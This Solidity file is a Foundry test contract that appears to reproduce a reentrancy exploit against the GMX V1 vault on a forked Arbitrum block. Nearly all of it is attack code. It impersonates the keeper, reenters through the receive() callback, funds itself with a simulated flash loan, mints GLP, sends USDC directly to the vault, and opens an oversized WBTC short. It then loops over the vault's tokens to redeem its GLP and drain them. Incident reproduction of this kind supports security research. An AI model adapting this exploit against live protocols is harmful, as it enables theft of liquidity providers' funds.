// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";
import "../GMXInterfaces/IGLPManager.sol";
import "../GMXInterfaces/IGMXOrderbookV1.sol";
import "../GMXInterfaces/IGMXPositionManagerV1.sol";
import "../GMXInterfaces/IGMXRouter.sol";
import "../GMXInterfaces/IGMXRewardRouterV2.sol";
import "../GMXInterfaces/IGMXVaultV1.sol";

contract GMXEXPNewTry is BaseTestWithBalanceLog {
    // --- Constants ---
    address public constant GMX_VAULT_V1 = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address public constant GMX_ORDERBOOK_V1 = 0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB;
    address public constant GMX_POSITION_MANAGER_V1 = 0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C;
    address public constant GMX_ROUTER_V1 = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address public constant GMX_REWARD_ROUTER_V2 = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
    address public constant GMX_GLPMANAGER = 0x3963FfC9dff443c2A94f21b129D429891E32ec18;

    address public GMX_KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;

    // Token addresses on Arbitrum One
    address public constant FRAX = 0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F;
    address public constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address public constant USDT = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
    address public constant DAI = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;
    address public constant USDC_BRIDGED = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address public constant UNI = 0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0;
    address public constant LINK = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
    address public constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;

    // Array of all token addresses for easy iteration
    address[] public tokenAddresses = [FRAX, USDC, USDT, DAI, USDC_BRIDGED, UNI, LINK, WETH, WBTC];
    address[] public unstakeAssets = [WBTC, WETH, USDC_BRIDGED, LINK, UNI, USDT, FRAX, DAI];

    IGMXVaultV1 public gmxVault = IGMXVaultV1(payable(GMX_VAULT_V1));
    IGMXOrderBookV1 public gmxOrderBook = IGMXOrderBookV1(payable(GMX_ORDERBOOK_V1));
    IGMXPositionManagerV1 public gmxPositionManger = IGMXPositionManagerV1(payable(GMX_POSITION_MANAGER_V1));
    IGMXRewardRouterV2 public gmxRewardRouter = IGMXRewardRouterV2(payable(GMX_REWARD_ROUTER_V2));
    IGLPManager public glpManger = IGLPManager(GMX_GLPMANAGER);
    IGMXRouter public gmxRouter = IGMXRouter(payable(GMX_ROUTER_V1));

    // --- Structs ---
    struct OrderParams {
        // Common
        address account;
        uint256 orderIndex;
        address collateralToken;
        uint256 collateralDelta;
        address indexToken;
        uint256 sizeDelta;
        bool isLong;
        uint256 triggerPrice;
        bool triggerAboveThreshold;
        uint256 executionFee;
        uint256 ethInitOrder;
        bool isIncrease;
    }

    OrderParams public increaseOrderParams;
    OrderParams public decreaseOrderParams;

    uint256 USDC_FLASHLOAN_AMT = 7_538_567_619_570;
    uint256 USDC_DIRECT_TRANSFER_TO_VAULT_AMT = 1538567619570;
    uint256 USDC_GLPMINT_AMT = 6000000000000;
    uint256 WBTC_SHORT_SIZEDELTA = 15385676195700000000000000000000000000;

    constructor() {}

    struct Exit {
        address token;
        uint256 maxOut;
        uint256 usdValue;
        uint256 glpNeeded;
    }

    receive() external payable {
        if (msg.sender == GMX_ORDERBOOK_V1) {
            _flashloanUSDC();
        }
    }

    function setUp() public {
        vm.createSelectFork("arbitrum", 355880237 - 1);
        
        increaseOrderParams = OrderParams({
            account: address(this),
            orderIndex: 0,
            collateralToken: WETH,
            collateralDelta: 0,
            indexToken: WETH,
            sizeDelta: 531064000000000000000000000000000,
            isLong: true,
            triggerPrice: 1500000000000000000000000000000000,
            triggerAboveThreshold: true,
            executionFee: 0.0003 ether,
            ethInitOrder: 0.1000 ether,
            isIncrease: true
        });

        decreaseOrderParams = OrderParams({
            account: address(this),
            orderIndex: 0,
            collateralToken: WETH,
            collateralDelta: 26517133600000000000000000000000,
            indexToken: WETH,
            sizeDelta: 53106400000000000000000000000000,
            isLong: true,
            triggerPrice: 1500 * 1e30,
            triggerAboveThreshold: true,
            executionFee: 0.0003 ether,
            ethInitOrder: 0,
            isIncrease: false
        });
    }

    function test_GMXEXPNewTry() public {
        gmxRouter.approvePlugin(GMX_REWARD_ROUTER_V2);
        gmxRouter.approvePlugin(GMX_ORDERBOOK_V1);

        _createInitialIncreaseOrder();
        _createInitialDecreaseOrder();
        _executeDecreaseOrderFromKeeper();
    }

    function _createInitialIncreaseOrder() internal {
        vm.deal(address(this), increaseOrderParams.ethInitOrder + increaseOrderParams.executionFee);

        address[] memory path = new address[](1);
        path[0] = WETH;

        gmxOrderBook.createIncreaseOrder{value: increaseOrderParams.ethInitOrder + increaseOrderParams.executionFee}(
            path,
            increaseOrderParams.ethInitOrder,
            WETH,
            0,
            increaseOrderParams.sizeDelta,
            WETH,
            increaseOrderParams.isLong,
            increaseOrderParams.triggerPrice,
            increaseOrderParams.triggerAboveThreshold,
            increaseOrderParams.executionFee,
            true
        );
    }

    function _createInitialDecreaseOrder() internal {
        vm.deal(address(this), decreaseOrderParams.executionFee);

        gmxOrderBook.createDecreaseOrder{value: decreaseOrderParams.executionFee}(
            decreaseOrderParams.indexToken,
            decreaseOrderParams.sizeDelta,
            decreaseOrderParams.collateralToken,
            decreaseOrderParams.collateralDelta,
            decreaseOrderParams.isLong,
            decreaseOrderParams.triggerPrice,
            decreaseOrderParams.triggerAboveThreshold
        );
    }

    function _executeDecreaseOrderFromKeeper() internal {
        vm.startPrank(GMX_KEEPER);
        gmxPositionManger.executeIncreaseOrder(address(this), 0, 0xd4266F8F82F7405429EE18559e548979D49160F3);
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        gmxPositionManger.executeDecreaseOrder(
            address(this),
            0,
            0xd4266F8F82F7405429EE18559e548979D49160F3
        );
        vm.stopPrank();
    }

    function _initiateLeveragedReentrancy() internal {
        _mintAndStakeInitialGLP();
        TokenHelper.transferToken(USDC, GMX_VAULT_V1, USDC_DIRECT_TRANSFER_TO_VAULT_AMT);
        _createBigShort();
        _extractTheProfit();
        _decreaseShortAndDosomething();
    }

    function _mintAndStakeInitialGLP() internal {
        TokenHelper.approveToken(USDC, GMX_GLPMANAGER, USDC_GLPMINT_AMT);
        gmxRewardRouter.mintAndStakeGlp(USDC, USDC_GLPMINT_AMT, 0, 0);
    }

    function _createBigShort() internal {
        // First approve USDC to the vault
        TokenHelper.approveToken(USDC, GMX_VAULT_V1, type(uint256).max);
        
        // Create the short position with proper parameters
        // The key is to use USDC as collateral and WBTC as index token for shorting
        gmxVault.increasePosition(
            address(this),  // account
            USDC,           // collateralToken (USDC)
            WBTC,           // indexToken (WBTC to short)
            WBTC_SHORT_SIZEDELTA,  // sizeDelta
            false           // isLong (false = short)
        );
    }

    function glpNeededForTokenOut(
        address tokenOut_,
        uint256 tokenAmountOut_
    ) internal view returns (uint256 glpNeeded) {
        uint256 price = gmxVault.getMinPrice(tokenOut_);
        uint256 decimals = gmxVault.tokenDecimals(tokenOut_);
        uint256 targetUsdg = tokenAmountOut_ * (price) / (10 ** decimals);
        address glpToken = gmxRewardRouter.glp();
        uint256 glpSupply = IERC20(glpToken).totalSupply();
        uint256 aumInUsdg = glpManger.getAumInUsdg(false);
        glpNeeded = aumInUsdg == 0 ? 0 : targetUsdg * (glpSupply) / (aumInUsdg);
    }

    function _extractTheProfit() internal {
        for (uint256 i = 0; i < unstakeAssets.length; i++) {
            uint256 balance = TokenHelper.getTokenBalance(unstakeAssets[i], GMX_VAULT_V1);
            if (balance > 0) {
                uint256 glpNeeded = glpNeededForTokenOut(unstakeAssets[i], balance);
                if (glpNeeded > 0) {
                    gmxRewardRouter.unstakeAndRedeemGlp(
                        unstakeAssets[i], 
                        glpNeeded,
                        0,
                        address(this)
                    );
                }
            }
        }
    }

    function _decreaseShortAndDosomething() internal {
        gmxVault.decreasePosition(
            address(this), 
            USDC, 
            WBTC, 
            0, 
            WBTC_SHORT_SIZEDELTA, 
            false, 
            address(this)
        );
    }

    function _flashloanUSDC() internal {
        deal(USDC, address(this), USDC_FLASHLOAN_AMT);
        _initiateLeveragedReentrancy();
    }
}
